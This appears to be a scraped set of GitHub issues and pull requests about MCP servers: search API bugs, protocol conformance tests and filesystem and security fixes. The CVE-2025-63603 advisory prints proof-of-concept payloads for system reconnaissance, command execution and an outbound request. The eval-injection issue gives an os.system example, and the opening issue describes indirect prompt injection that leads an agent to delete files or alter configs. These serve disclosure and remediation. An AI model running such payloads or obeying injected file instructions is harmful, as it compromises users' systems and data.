title: Security consideration: Indirect Prompt Injection risk with recursive file operations
cleaned_text: Security consideration: Indirect Prompt Injection risk with recursive file operations Hi @mark3labs, I'm Joerg from ClawGuard, an open-source prompt injection scanner. While auditing popular MCP servers for security risks, I identified a potential vulnerability in mcp-filesystem-server. The Risk The delete_file (recursive), modify_file (regex-replace), and write_file tools expose powerful filesystem operations to LLM agents. This creates a risk for Indirect Prompt Injection attacks: An attacker places a crafted .txt file in a monitored directory The AI agent reads the file during a legitimate operation The injected instructions trigger delete_file with recursive flag, or modify_file to alter config files This is classified as OWASP LLM05 (Insecure Output Handling) — the LLM output (file operations) is not validated against the user's original intent. Suggested Mitigations Add a security disclaimer to the README warning users about prompt injection risks Implement a confirmation step before destructive operations (delete recursive, modify system files) Add path allowlisting beyond the current directory validation Consider rate limiting and audit logging for write/delete operations Our Scan Results We scanned mcp-filesystem-server with ClawGuard Shield (120 patterns, 12 languages, F1=97.4%) and found patterns matching data exfiltration and insecure output handling risks. Related reading: 6 Real MCP Security Breaches — documented incidents from WhatsApp, GitHub, Asana, and Smithery that show why MCP security scanning matters. Happy to share the full scan report if helpful. This is not a CVE filing — just a heads-up from the security community. Best, Joerg Michno ClawGuard — Open-Source AI Agent Security

title: lens_id is appended to the query text instead of applying the lens (affects built-in and custom lenses, local and hosted server)
cleaned_text: lens_id is appended to the query text instead of applying the lens (affects built-in and custom lenses, local and hosted server) Summary Passing lens_id to kagi_search_fetch does not apply the lens. Instead, the lens ID value (along with the literal word "lens") appears to be concatenated onto the search query , polluting results with pages about contact lenses, the French commune of Lens, etc. The failure is identical on a local uvx kagimcp install and on the hosted server at https://mcp.kagi.com/mcp , which indicates the defect is in the Kagi Search API backend (or a shared layer), not in the MCP server code. Environment Tested: 2026-10-15 Local server: uvx kagimcp (current PyPI release) Hosted server: https://mcp.kagi.com/mcp (Streamable HTTP, Bearer auth) Client: opencode (identical results from both transports) Affected lenses: all — documented built-in IDs ( 2 , 1 , 15 , 29 , …) as well as custom shareable lenses Key observation: the MCP server code is not the culprit Auditing src/kagimcp/server.py (introduced in commit 572df24 , unchanged since), the tool correctly passes lens_id as a top-level JSON body field of SearchRequest : SearchRequest( query=query, ..., lens_id=lens_id, lens=lens, ... ) The query string is never modified anywhere in the repo. Nevertheless the corruption described below occurs — on both the OSS server and Kagi's own hosted deployment — so the mangling happens server-side at Kagi. Reproduction Repro 1 — built-in lens fails to scope kagi_search_fetch(query="photosynthesis overview", lens_id="2") (Academic — should restrict to .edu domains) Actual: results from openstax.org, vedantu.com, quizlet.com, squarespace CDN images, youtube.com — no .edu restriction whatsoever. Repro 2 — verbatim value leak (cleanest proof) kagi_search_fetch(query="Rathaus Öffnungszeiten", lens_id="zzz-not-a-lens") Actual results reference both halves of the fake ID : https://finde-offen.ch/lens/administration-communale-de-lens-336625 ← "lens" https://www.reddit.com/r/ZZZ_Official/... , hoyolab.com (Zenless Zone Zero) ← "zzz" This demonstrates the raw lens_id string is being injected into the query text (effective query ≈ " lens " , possibly a lens: operator string that gets tokenized). Repro 3 — custom shareable lens (works in the web UI, broken via API) Lens 21365 ("Nürnberg" — city-scoped lens, confirmed shareable and working correctly at kagi.com in the browser). kagi_search_fetch(query="Rathaus Öffnungszeiten", lens_id="21365") Actual: https://lens.fr/ https://www.oeffnungszeitenbuch.de/filiale/Lens-Administration%20communale%20de%20Lens-4237080R.html Town-hall pages from arbitrary German municipalities Control (same query, no lens_id ): clean, relevant results (wuerzburg.de, bretten.de, ortsdienst.de — no "lens" noise). Repro 4 — further custom lenses, same pattern Lens | Query | Returned instead of scoped results 30109 (RIPE document store) | "membership fees" | lens.com/faq/fee, lens.org, reddit thread about lens.com 3271 (Kagi Documentation) | "pricing plans" | lenshq.io/pricing, lens.tech/plans, smartbuyglasses.com lens pricing 21365 (Nürnberg) | "Stadtwerke" | Wikipedia "Lens, Pas-de-Calais", lensesrx.com Full URL forms ( https://kagi.com/lenses/ ) behave identically to bare IDs. Expected behavior lens_id restricts results to the lens's curated sources (as documented in the tool description and the SearchRequest.lens_id model description). Invalid/unresolvable lens IDs should produce an error, not silent query pollution. Impact Silent result degradation — searches *appear* to succeed but return irrelevant results, which is worse than a loud failure. Agents relying on lens_id get confidently wrong output. All 11 lenses tested (custom + built-in) were affected. Workaround Using include_domains with the lens's domain list produces correctly scoped results. lens_id is unusable until fixed. Additional notes for triage No meta.trace / X-Kagi-Trace IDs are available for successful responses through the MCP tool (the server returns only the markdown body), but the repros above should replicate in the API playground at https://kagi.com/api/playground/search Related but distinct: the lens *object* (inline sites_included / sites_excluded via include_domains / exclude_domains ) works correctly — only the lens_id reference path is broken Happy to provide API keys/request logs privately if that helps debugging

title: Search results carry `<strong>` highlight tags, duplicate URL lines and a doubled payload
cleaned_text: Search results carry highlight tags, duplicate URL lines and a doubled payload Hey! I just hooked Kagi up as a web search backend in maki (a coding agent that's pretty obsessed with token usage) through https://mcp.kagi.com/mcp . The results themselves are great, but the text the model gets has a fair bit of overhead that's not useful to an LLM. For a plain kagi_search_fetch call ( query = "rust async runtime smol" , limit = 8 ) the text block is 7,095 bytes. 1,547 of those are / around query terms in the snippets (182 tags), and another 557 are the URL: lines, which repeat the link that's already in the ### title heading right above them. Titles also come HTML-encoded ( That's ). Stripping those gets it down to 4,987 bytes with nothing lost, so roughly 30% fewer tokens per search. Tokio vs Smol: The Async Runtime Battle That's Dividing Rust... URL: https://www.youtube.com/watch?v=IcCeyUIST6I Published: 2025-10-15 Tokio and Smol , the most popular async runtimes in Rust . ... I know most of this comes from the Search API's markdown format, which the docs say is still being worked on, so I'm happy to send it to developers@kagi.com instead if that's the better place. A way to turn off highlighting there would already cover the biggest part. One part is on the MCP side: every response carries the result twice, once in content[0].text and again in structuredContent.result , because FastMCP wraps the -> str return. So the download is about 14.5 KB for 7 KB of text. Would you be up for dropping the return annotation on kagi_search_fetch so it only sends content ? We strip the tags and URL lines on our side for now, so no rush on any of this :)

title: Bug Report: Context Oversupply / Citation Spam in Long Conversations
cleaned_text: Bug Report: Context Oversupply / Citation Spam in Long Conversations What follows is Kagi Assistant output; I have been using a custom Assistant to help better understand the Assistant framework and trace bugs that we are experiencing: Bug Report: Context Oversupply / Citation Spam in Long Conversations Repository: kagisearch/kagimcp 1. What happened? How did it happen? Steps to replicate The kagimcp tool (utilized by the Kagi Assistant's ResearchAgent) exhibits context oversupply behavior in long conversational threads, flooding the downstream LLM with massive blocks of historical citations that are no longer relevant to the user's current, turn-specific intent. Specific incident (live example from this session): After a 20+ turn technical discussion covering RAG, LLM Guardrails, and Confabulation, the user asked: *"Could you write another bug report specifically for this tool?"* referencing kagimcp . Instead of providing minimal or no research (as the request was procedural), the ResearchAgent (via kagimcp ) injected a 47-citation block covering RAG, Guardrails, and Confabulation—themes from 10+ turns prior, completely unrelated to writing a GitHub issue. The citation block ends with the truncated footer "Research trajectory of ResearchAgent:" , indicating potential looping or mid-process accumulation. Impact: Signal-to-noise collapse: The assistant must parse 3,000+ tokens of off-topic citations to find the user's actual 1-sentence prompt. Provenance degradation: The LLM conflates historical agent output with current user intent, leading to misattribution ("you provided these citations" when the user did not). Token waste: Unnecessary consumption of context window and user token budget on non-actionable information. Steps to replicate: Start a long technical thread (15+ turns) using the Assistant with web search enabled. Engage the ResearchAgent on broad topics (e.g., "explain RAG," "discuss guardrails," "define confabulation"), accepting its citation-rich outputs. Shift to a narrow, self-contained request that does *not* require those topics (e.g., "write a bug report for this tool," "draft a summary of *this* conversation," or a simple coding task). Observe that kagimcp still retrieves and injects the historical citation themes, even though they are off-topic for the current turn. 2. What did you expect to happen? Describe the desired functionality Expected behavior: The kagimcp tool should scope retrievals to the current turn's explicit intent . It should recognize conversational drift and treat historical topics as inactive unless the user explicitly references them or asks for research. When the user's request is self-contained (e.g., "write a bug report" or "correct this code"), the tool should return null or minimal context rather than aggressively backfilling historical citations. Desired functionality: Intent-first retrieval: Check if the user's current message explicitly requires web search/document retrieval before executing broad queries. If the prompt is procedural, reflective, or self-referential, suppress retrieval. Conversational drift detection: Maintain awareness that topics discussed >10 turns ago are not presumptively relevant to the current turn. Weight recency heavily in relevance scoring. Null response capability: Allow the tool to return "No new research required for this prompt" rather than defaulting to historical citation dumps to "be helpful." Turn-boundary scoping: Treat each user message as an independent intent check, not as a continuation of the accumulated research trajectory.

title: NPE (-32603) on prompts/get with explicit JSON null argument in programmatic PromptManager API
cleaned_text: NPE (-32603) on prompts/get with explicit JSON null argument in programmatic PromptManager API What With a prompt registered through the programmatic PromptManager API, a prompts/get request that carries an explicitly null optional argument (a shape some clients send for unset optionals) fails with a JSON-RPC internal error: {"jsonrpc":"2.0","id":2,"error":{"code":-32603,"message":"Internal error"}} Server log: ERROR [io.quarkiverse.mcp.server.runtime.PromptMessageHandler] Unable to obtain prompt explore_database: java.lang.NullPointerException: Cannot invoke "Object.toString()" because the return value of "java.util.Map$Entry.getValue()" is null at io.quarkiverse.mcp.server.runtime.PromptManagerImpl$PromptDefinitionInfo.createArguments(PromptManagerImpl.java:349) at io.quarkiverse.mcp.server.runtime.PromptManagerImpl$PromptDefinitionInfo.createArguments(PromptManagerImpl.java:305) at io.quarkiverse.mcp.server.runtime.FeatureManagerBase$FeatureDefinitionInfoBase.call(FeatureManagerBase.java:690) Root cause PromptManagerImpl$PromptDefinitionInfo.createArguments stringifies every received argument: Map args = new HashMap<>(); for (Entry e : argumentProviders.args().entrySet()) { args.put(e.getKey(), e.getValue().toString()); } arguments.getMap() keeps null values for explicit JSON nulls, so .toString() NPEs. Note that skipping just the toString() is not enough: PromptArgumentsImpl then does Map.copyOf(args) , which also rejects null values. Verified still present on main (line 355 at 514607a12cabbaa9acc21fca8447d7c677679f83; the line is at 349 in 2.0.0): https://github.com/quarkiverse/quarkus-mcp-server/blob/514607a12cabbaa9acc21fca8447d7c677679f83/core/runtime/src/main/java/io/quarkiverse/mcp/server/runtime/PromptManagerImpl.java#L352-L355 Steps to reproduce Register a prompt programmatically with an optional argument: promptManager.newPrompt("explore_database") .addArgument("source", "Source id", false) .setHandler(args -> PromptResponse.withMessages(PromptMessage.withUserRole("ok"))) .register(); Then send over stdio (after initialize ): {"jsonrpc":"2.0","id":2,"method":"prompts/get","params":{"name":"explore_database","arguments":{"source":null}}} Result: -32603 Internal error . Omitting arguments entirely, or the source key, works fine. Expected behavior An explicit null should be treated like a missing optional argument, exactly as annotated @Prompt methods behave in FeatureManagerBase.handleParam (null → default value → required-argument check). A fix could skip null entries before applying defaults, keeping the Map null-free: for (Entry e : argumentProviders.args().entrySet()) { if (e.getValue() != null) { args.put(e.getKey(), e.getValue().toString()); } } Workaround Declare the prompt with @Prompt / @PromptArg annotations instead of the programmatic API: optional arguments then arrive as plain null and the request succeeds. (The annotated path is unaffected by this bug.) Environment: quarkus-mcp-server 2.0.0 (Quarkus 3.40.1), reproduced over the stdio transport; no duplicate issue found for this.

title: MCP 2026-07-28 requests succeed without the required MCP-Protocol-Version HTTP header
cleaned_text: MCP 2026-07-28 requests succeed without the required MCP-Protocol-Version HTTP header A Streamable HTTP tools/call request containing valid 2026-07-28 body metadata, Mcp-Method and Mcp-Name , but no MCP-Protocol-Version header, executes the tool and returns HTTP 200. Expected: HTTP 400 with JSON-RPC error -32020 ( HeaderMismatch ). The Server Validation rules explicitly list a missing MCP-Protocol-Version header as a validation failure. The legacy exception permits treating headerless requests as 2025-03-26 ; this request instead gets processed as the newer stateless protocol, returning resultType: complete and server identity metadata. Here's a test: import static org.junit.jupiter.api.Assertions.assertEquals; import org.junit.jupiter.api.Test; import org.junit.jupiter.api.extension.RegisterExtension; import io.quarkiverse.mcp.server.Tool; import io.quarkiverse.mcp.server.test.McpAssured; import io.quarkiverse.mcp.server.test.McpServerTest; import io.quarkus.test.QuarkusUnitTest; import io.restassured.RestAssured; import io.restassured.response.Response; import io.restassured.specification.RequestSpecification; import io.vertx.core.json.JsonObject; public class MissingProtocolVersionHeaderTest extends McpServerTest { @RegisterExtension static final QuarkusUnitTest config = defaultConfig() .withApplicationRoot(root -> root.addClass(MyTools.class)); @Test public void matchingVersionHeaderSucceeds() { Response response = callHello(true); assertEquals(200, response.statusCode(), response::asString); JsonObject body = new JsonObject(response.asString()); assertEquals("hello", body.getJsonObject("result").getJsonArray("content") .getJsonObject(0).getString("text")); } @Test public void missingVersionHeaderIsRejected() { Response response = callHello(false); assertEquals(400, response.statusCode(), response::asString); JsonObject body = new JsonObject(response.asString()); assertEquals("2.0", body.getString("jsonrpc")); assertEquals(-32020, body.getJsonObject("error").getInteger("code")); } private Response callHello(boolean includeVersionHeader) { JsonObject message = new JsonObject().put("jsonrpc", "2.0").put("id", 1) .put("method", "tools/call") .put("params", new JsonObject().put("name", "hello").put("arguments", new JsonObject())); McpAssured.injectStatelessMeta(message); message.getJsonObject("params").getJsonObject("_meta") .put("io.modelcontextprotocol/protocolVersion", "2026-07-28"); RequestSpecification request = RestAssured.given().baseUri(testUri.toString()) .contentType("application/json").accept("application/json,text/event-stream") .header("Mcp-Method", "tools/call").header("Mcp-Name", "hello"); if (includeVersionHeader) { request.header("MCP-Protocol-Version", "2026-07-28"); } return request.body(message.encode()).post("/mcp"); } public static class MyTools { @Tool public String hello() { return "hello"; } } }

title: MCP 2026-07-28 method-not-found errors return HTTP 200 instead of 404
cleaned_text: MCP 2026-07-28 method-not-found errors return HTTP 200 instead of 404 The 2026-07-28 Streamable HTTP specification requires HTTP 404 with -32601 when the requested RPC method is not implemented. Here is a test: import static org.junit.jupiter.api.Assertions.assertEquals; import static org.junit.jupiter.api.Assertions.assertFalse; import org.junit.jupiter.api.Test; import org.junit.jupiter.api.extension.RegisterExtension; import io.quarkiverse.mcp.server.Tool; import io.quarkiverse.mcp.server.test.McpAssured; import io.quarkiverse.mcp.server.test.McpServerTest; import io.quarkus.test.QuarkusUnitTest; import io.restassured.RestAssured; import io.restassured.response.Response; import io.vertx.core.json.JsonObject; public class MissingMethodStatusTest extends McpServerTest { @RegisterExtension static final QuarkusUnitTest config = defaultConfig() .withApplicationRoot(root -> root.addClass(MyTools.class)); @Test public void removedInitializeReturns404() { assertMethodNotFound("initialize"); } @Test public void unknownMethodReturns404() { assertMethodNotFound("qe/nonexistent"); } private void assertMethodNotFound(String method) { JsonObject request = new JsonObject().put("jsonrpc", "2.0").put("id", 1) .put("method", method).put("params", new JsonObject()); McpAssured.injectStatelessMeta(request); Response response = RestAssured.given().baseUri(testUri.toString()) .contentType("application/json").accept("application/json,text/event-stream") .header("MCP-Protocol-Version", "2026-07-28").header("Mcp-Method", method) .body(request.encode()).post("/mcp"); JsonObject body = new JsonObject(response.asString()); assertEquals("2.0", body.getString("jsonrpc")); assertEquals(1, body.getInteger("id")); assertFalse(body.containsKey("result")); assertEquals(-32601, body.getJsonObject("error").getInteger("code")); assertEquals(404, response.statusCode(), response::asString); } public static class MyTools { @Tool public String hello() { return "hello"; } } } ATM, the response I am seeing has status code 200 instead.

It adds strict runtime Zod validation, complete JSON Schema 2020-12 tool contracts, structured results, safer transactional mutations and recovery, multiple explicitly configured vaults, and actionable diagnostics. Before upgrading Node.js 22 or newer is required. Existing v1 positional vault configuration continues to start during the compatibility window and prints its exact replacement arguments to stderr. Both MCP 2026-07-28 and 2025-era clients are served by default. Tool names and argument shapes changed; see the migration guide before updating integrations. Read the full migration guide: https://github.com/StevenStavrakis/obsidian-mcp/blob/v2.0.0/MIGRATING.md Install with npm install -g obsidian-mcp .

title: fix: transaction fails on drives where fs.link() returns EISDIR
cleaned_text: fix: transaction fails on drives where fs.link() returns EISDIR My Obsidian vault lives on a USB drive and every write operation was failing with TRANSACTION_FAILED: Transaction was rolled back — no other details. Dug into it and found that fs.link() in atomicWrite() throws EISDIR on my drive instead of EPERM / ENOSYS / EXDEV , so the existing fallback to fs.rename() never kicks in. Added EISDIR to the catch list. While I was at it, I also made syncDirectory() and writeDurable() swallow fsync errors instead of rethrowing — fsync on a directory handle throws EPERM on my drive too, and since the atomic write pattern already handles integrity, fsync is just a durability bonus anyway. I tested create, read, and delete on the affected drive and they all work now.

title: `obsidian_create_note` fails with TRANSACTION_FAILED on FAT32/exFAT drives
cleaned_text: obsidian_create_note fails with TRANSACTION_FAILED on FAT32/exFAT drives Describe the bug obsidian_create_note always fails with TRANSACTION_FAILED: Transaction was rolled back when the vault is located on a FAT32-formatted drive (e.g., a USB stick). All other tools — including obsidian_edit_note , obsidian_create_directory , obsidian_read_note , and obsidian_search_vault — work correctly. Moving the vault to an NTFS-formatted drive resolves the issue immediately. To Reproduce Steps to reproduce the behavior: Format a USB drive as FAT32 (or use an existing one) Create or move an Obsidian vault to that drive (ensure .obsidian/ directory exists) Configure obsidian-mcp to use the vault: "args": ["-y", "obsidian-mcp@2", "serve", "--vault", "main=D:/path/to/vault"] Call obsidian_create_note with any valid path and content Result: TRANSACTION_FAILED: Transaction was rolled back Expected behavior obsidian_create_note should create the note successfully regardless of the filesystem. Diagnostics and logs (if available) No additional logs beyond the TRANSACTION_FAILED error. The transaction is rolled back cleanly every time. Environment (please complete the following information): OS and version: Windows 10 Node.js version: v23.x obsidian-mcp version: 2.0.1 MCP client and version: Roo Code (VS Code extension)

title: Return structured citations to clients that advertise citation rendering capability, following draft SEP-3094 format
cleaned_text:
Return structured citations to clients that advertise citation rendering capability, following draft SEP-3094 format What changed Clients that advertise that they support rendering structured citations will get back structured citations, rather than having citation metadata dumped into the markdown response. There is no change for clients that do not opt in. See https://github.com/modelcontextprotocol/modelcontextprotocol/pull/3094 for more details on the draft spec. Before: { "content": [ { "type": "text", "text": "Supported claim[1].

Citations:
[1] https://example.com/source
" } ] } After: { "content": [ { "type": "text", "text": "Supported claim[1]." } ], "citations": [ { "id": "1", "name": "Source", "url": "https://example.com/source#:~:text=Supporting%20passage", "text": "Supporting passage" } ] } Notes How each citation field is filled: id. Connection to markdown marker, if present. Omitted for perplexity_search , which only does block-level citations. name. The page title from the search result. If the result has no title, the URL annotation title is used. Omitted when neither exists. publisher.name. The site label from the URL, matching the shortened hostname that the Perplexity web UI shows for sources. A leading www. is removed, then the public suffix, so apnews.com becomes apnews , en.wikipedia.org becomes wikipedia , and bbc.co.uk becomes bbc . Unparsable or IP-based URLs are not changed. text. One passage from the snippet. Snippets join separate extracts with ... and line breaks, so the snippet is split into blocks at those points. Heading blocks are dropped, and the first remaining block with at least six words that ends in . , ! , or ? is used. That rule skips page titles and standalone datelines. If no block qualifies, the first non-heading block is used. Markdown is removed: link and image labels are kept, code spans are unwrapped, and emphasis, heading, blockquote, and list markers are removed. Whitespace is collapsed, and the passage is capped at 300 characters at a word boundary. Omitted when nothing remains. url. The result URL plus a text fragment for the text passage. Passages of 10 words or fewer use the whole passage, as in #:~:text=Court%20says%20the%20holding%20is%20settled. . Longer passages use the first five and last five words as start and end anchors, as in #:~:text=Sea%20turtle%20eggs%20have%20been,for%20any%20sea%20turtle%20species. , which keeps the URL short. Dashes are encoded as %2D so they aren't read as fragment syntax. The fragment is skipped when the passage is empty, the URL already has a hash, or the scheme is not http or https . datePublished. The result's date , when the API sends one.

title: ci: pin and verify MCP publisher artifact
cleaned_text: ci: pin and verify MCP publisher artifact Why The MCP registry publish workflow downloads and executes the moving upstream latest publisher artifact in the same job that receives MCP_REGISTRY_PRIVATE_KEY . Production environment approval limits when the job runs, but it does not verify which publisher binary receives that key. This creates a concrete registry-publication and credential-exposure path if the upstream publisher release channel is compromised. What changed Pin the publisher download to upstream release v1.8.1 and its Linux amd64 asset. Verify the independently checked SHA-256 before extracting or executing the publisher. Fail downloads explicitly while preserving the existing production environment gate. This is intentionally scoped to MCP registry publication. The separate npm OIDC/provenance workflow and other CLI release chains are unchanged. Verification evidence The pinned digest a06c9096dcb9727c13555b6be26c7effa707b01f06a4c561ba7a3635443cf2cc agrees across the upstream checksum file, GitHub's release-asset digest, and an independently downloaded v1.8.1 archive. The verification command accepts that archive and rejects a mismatched digest before extraction. Review MCP release owners: @rbuchmayer-pplx and @kesku.

title: Skip first row in query result if query is SELECT only

After testing several queries (see below), I found that only SELECT statements include a header row in the result set. For more details, refer to When the Row resultset contains Header. - DML - SELECT - DDL - CREATE_TABLE - DROP_TABLE - UTILITY - DESCRIBE_TABLE - SHOW_DATABASES - SHOW_TABLES In this PR, it checks the SubstatementType field in the GetQueryExecution response to determine whether to treat the first row as a header.

title: Fix stale access token issue
cleaned_text: Fix stale access token issue Some reports say that the access tokens expires quickly and are not automatically refreshed. This should be covered by the logic in LocalSettings.get_access_token that refreshes the token is the current token has expired. But issues like a misaligned system clock might cause it not to refresh in time. This change refreshes the token if there's any 401 error to an underlying API call Test plan There are 3 calls that need to be covered, standard management api calls, sdk calls and graphql calls. Tested all of them by altering ~/.singlestore/credentials.json such that we had a expired access token, a valid refresh token, and an expiry date that was set in the future. Altered some tools slightly to ensure I could test all 3 types of api calls, and confirmed they all refreshed the token properly [!NOTE] Medium Risk Adds automatic token refresh and single-retry behavior across Management API, GraphQL, and SDK calls, which changes authentication/error handling paths and could mask underlying 401 causes if misapplied. Scope is contained to local OAuth-token flows (not API key/remote auth) and retries are bounded to once to avoid loops. Overview Addresses short-lived/stale OAuth sessions by refreshing the access token and retrying once on 401 Unauthorized . This introduces LocalSettings.force_token_refresh() (uses refresh token regardless of local expiry) and wires it into three call paths: build_request() for raw HTTP Management API calls, query_graphql_organizations() for GraphQL, and a new call_sdk_with_retry() helper used by jobs/notebooks/workspaces tooling to retry SingleStore SDK operations after a 401. Also bumps version to 0.4.17 and adds a changelog entry describing the fix. Reviewed by Cursor Bugbot for commit 9475a695b0e279c4ad74f69d41017d4e27d51ac9. cleaned_text: MCP spec conformance: 10 requirement(s) violated (via @hasmcp/mcp-spec-test) Running uvx mcp-server-ds fails to complete the MCP protocol handshake — the server process crashes on startup before it can respond to any request, so it fails 10 of 36 applicable requirements under the 2026-07-28 spec revision and 5 of 20 under the 2025-11-25 revision (same root cause in both; the two revisions apply different total numbers of test cases, hence the different counts). Digging in, this looks like a genuine startup bug rather than a test-environment artifact: running uvx mcp-server-ds --help directly reproduces a crash at import time — ImportError: cannot import name 'McpError' from 'mcp.server' — because the currently-resolved mcp SDK version no longer exports McpError from that module (it looks like the same underlying incompatibility already reported in #7). Since mcp-server-ds 's dependency on mcp isn't pinned to a compatible version, a fresh uvx / pip install today pulls in a newer mcp release that breaks this import, and the server never gets far enough to speak the protocol at all. title: CVE-2025-63603: Command Injection
cleaned_text: CVE-2025-63603: Command Injection CVE-2025-63603. Summary A critical command injection vulnerability has been identified in the MCP Data Science Server's safe_eval() function. Despite its name suggesting safety, this function allows arbitrary Python code execution with full system privileges, enabling complete system compromise. Vulnerability Details Location File : src/mcp_server_ds/server.py Function : ScriptRunner.safe_eval() (Line 108) Component : MCP Data Science Server Root Cause Analysis The vulnerability stems from three critical security flaws: 1. Unsafe exec() Usage def safe_eval(self, script: str, save_to_memory: Optional[List[str]] = None): # ❌ VULNERABLE: Direct execution of user input exec(script, {'pd': pd, 'np': np, 'scipy': scipy, 'sklearn': sklearn, 'statsmodels': sm}, local_dict) 2. Missing builtins Restriction ⚠️ CRITICAL FLAW The globals dictionary lacks the ' builtins ' key. When this key is missing, Python automatically adds all built-in functions , including dangerous ones like: import () - Import any module exec() - Execute additional code eval() - Evaluate expressions open() - Access file system getattr() - Access object attributes 3. No Input Validation User-provided scripts undergo zero validation before execution. Proof of Concept Test Environment Target : MCP Data Science Server Python Version : 3.11.9 Operating System : Windows 10 Attack Vector : run_script tool PoC Execution Results Phase 1: System Information Gathering Payload print("=== Command Injection PoC - System Information ===") import sys, os, platform, getpass print(f"Python Version: {sys.version}") print(f"Operating System: {platform.system()} {platform.release()}") print(f"Current User: {getpass.getuser()}") print(f"Working Directory: {os.getcwd()}") Result: Phase 2: Environment Variable Access Payload import os critical_vars = ['PATH', 'USERNAME', 'USERPROFILE'] for var in critical_vars: print(f"{var}: {os.environ.get(var)}") Result: Phase 3: File System Reconnaissance Payload import os print("User directory contents:") items = os.listdir(os.path.expanduser('~')) for item in items[:8]: print(f" {item}") Result: Phase 4: System Command Execution Payload import subprocess result = subprocess.run(['whoami'], capture_output=True, text=True) print(f"Command Output: {result.stdout.strip()}") Result: Phase 5: Network Information & External Connectivity Payload import socket, urllib.request print(f"Local IP: {socket.gethostbyname(socket.gethostname())}") response = urllib.request.urlopen('http://httpbin.org/ip') print(f"External IP: {response.read().decode()}") Result: Impact Assessment Immediate Threats ✅ Complete System Information Disclosure Operating system details User account information Directory structure mapping Network configuration ✅ File System Access Read/write access to user directories Access to configuration files (.aws, .azure, etc.) Potential access to SSH keys and credentials ✅ Command Execution Capability Execute arbitrary system commands Install malware or backdoors Lateral movement within network ✅ Network Reconnaissance Internal IP address disclosure External connectivity confirmation Potential for data exfiltration Technical Deep Dive: Why the Attack Works The builtins Auto-Addition Mechanism Current vulnerable code globals_dict = {'pd': pd, 'np': np, 'scipy': scipy, 'sklearn': sklearn, 'statsmodels': sm} exec(script, globals_dict, local_dict) What Python does internally: Python automatically adds this when ' builtins ' key is missing: globals_dict[' builtins '] = { ' import ': import , 'exec': exec, 'eval': eval, 'open': open, 'getattr': getattr, 'setattr': setattr, # ... and 100+ other built-in functions } This auto-addition mechanism completely bypasses any intended security restrictions. Remediation Add ' builtins ': {} to the globals dictionary def safe_eval(self, script: str, save_to_memory: Optional[List[str]] = None): # ✅ SECURE: Explicitly restrict builtins safe_globals = { 'pd': pd, 'np': np, 'scipy': scipy, 'sklearn': sklearn, 'statsmodels': sm, ' builtins ': { # ⚠️ CRITICAL: Must be explicitly defined # Only include absolutely necessary functions 'len': len, 'str': str, 'int': int, 'float': float, 'print': print, # For output capture # ❌ NEVER include: import , exec, eval, open, getattr } } exec(script, safe_globals, local_dict) Replace exec() with Safe Alternatives Use AST (Abstract Syntax Tree) parsing for code validation Implement a restricted Python execution environment Consider using RestrictedPython library Conclusion The MCP Data Science Server contains a critical command injection vulnerability that provides attackers with complete system access. The root cause is the automatic addition of Python's builtins when the key is missing from the globals dictionary in exec() calls. title: fix: replace eval() with json.loads() to prevent code injection
cleaned_text: fix: replace eval() with json.loads() to prevent code injection Summary Replace eval() with json.loads() in visualize_data tool handler Add import json to module imports Fixes #10 Problem The visualize_data tool handler uses eval() to parse the vegalite_specification argument, which comes directly from MCP tool call input. This allows arbitrary Python code execution (CWE-95). Solution Since Vega-Lite specifications are JSON objects, json.loads() is the correct parser. This is a drop-in replacement that preserves existing functionality while eliminating the code execution risk. Changes File | Change src/mcp_server_vegalite/server.py | eval() → json.loads() , add import json Testing json.loads() parses the same JSON strings that eval() was parsing No behavioral change for valid Vega-Lite specs (which are always JSON) Invalid input now raises json.JSONDecodeError instead of executing arbitrary code

title: Security: eval() on user input in visualize_data tool handler
cleaned_text: Security: eval() on user input in visualize_data tool handler Summary The visualize_data tool handler at server.py:132 uses eval() to parse the vegalite_specification argument: vegalite_specification = eval(arguments["vegalite_specification"]) Since arguments["vegalite_specification"] comes directly from MCP tool call input, this allows arbitrary Python code execution. For example, a crafted input like import ('os').system('...') would execute system commands. Impact CWE-95 : Eval Injection Severity : Critical — Remote Code Execution (RCE) via MCP tool call Attack vector : A prompt-injected LLM or malicious client can pass arbitrary Python code as the vegalite_specification argument Suggested Fix Since Vega-Lite specifications are JSON objects, replace eval() with json.loads() : import json vegalite_specification = json.loads(arguments["vegalite_specification"]) This preserves the existing functionality (parsing a JSON string into a dict) while eliminating the code execution risk. I've submitted a PR with this fix.

title: fix: run Prometheus requests off the event loop
cleaned_text: fix: run Prometheus requests off the event loop Problem All tools are async def , but they call make_prometheus_request() directly, and that function uses the blocking requests.get() . While one query waits on Prometheus, the event loop is stuck: other tool calls wait behind it, so each process serves one query at a time, and the /health route on the same Starlette app stops answering. We run the server in HTTP mode on Kubernetes with probes on /health . A heavy query that hits the 30s PROMETHEUS_REQUEST_TIMEOUT makes the pod fail readiness, and Kubernetes takes it out of the Service. Raising the timeout doesn't help: once a query blocks for longer than the liveness window, Kubernetes restarts the pod while the query is still running. Fix The blocking calls in execute_query , execute_range_query , list_metrics (through get_cached_metrics ), get_metric_metadata , get_targets and the health_check tool now run in asyncio.to_thread . make_prometheus_request itself is unchanged. Existing mocks still work because the module-level name is looked up at call time. Test test_slow_prometheus_request_does_not_block_event_loop runs a mocked 0.5s request next to a ticker coroutine. On main the ticker gets one tick and the test fails; with this change it passes. Locally, everything except test_docker_integration.py passes (152 tests). 🤖 Generated with Claude Code

title: chore(deps): bump pyjwt from 2.12.0 to 2.15.0
cleaned_text:
chore(deps): bump pyjwt from 2.12.0 to 2.15.0 Bumps pyjwt from 2.12.0 to 2.15.0. Release notes Sourced from pyjwt's releases . 2.15.0 See the 2.15.0 changelog for complete release details. 2.14.0 See the 2.14.0 changelog for the complete release details and related security advisories. 2.13.0 PyJWT 2.13.0 — Security Release This release bundles five security fixes plus three additional hardening / spec-compliance changes. We recommend all users upgrade. Security GHSA-xgmm-8j9v-c9wx — JWK JSON accepted as HMAC secret (algorithm confusion). HMACAlgorithm.prepare_key previously rejected PEM- and SSH-formatted asymmetric keys but did not catch a JWK passed as a raw JSON string. In a verifier configured with both symmetric and asymmetric algorithms in algorithms=[…] and a raw-JSON JWK as the key, an attacker could forge HS256 tokens using the JWK text as the HMAC secret. The guard has been extended to reject any JWK-shaped JSON. Reported by @​aradona91 . GHSA-jq35-7prp-9v3f — Algorithm allow-list bypass with PyJWK / PyJWKClient . When verifying with a PyJWK , the caller's algorithms=[…] allow-list was checked against the token header alg as a string only; actual verification used the algorithm bound to the PyJWK . An attacker who controlled a registered JWKS key could sign with one algorithm and advertise another on the header. PyJWT now requires the token header alg to match the PyJWK 's algorithm before verification. Reported by @​sushi-gif . GHSA-w7vc-732c-9m39 — DoS via base64 decode of unused 